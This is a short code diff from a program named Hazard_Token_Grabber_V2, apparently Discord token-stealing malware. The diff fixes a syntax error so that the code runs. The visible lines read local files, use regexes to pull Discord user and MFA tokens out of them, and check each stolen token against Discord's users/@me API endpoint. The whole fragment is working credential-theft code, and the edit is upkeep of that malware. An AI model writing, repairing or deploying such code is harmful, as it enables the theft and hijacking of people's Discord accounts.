@@ -226,7 +226,7 @@ class Hazard_Token_Grabber_V2:
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                     for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                         for token in findall(regex, line):
-                            try
+                            try:
                                 r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
                             except Exception:
                                 pass
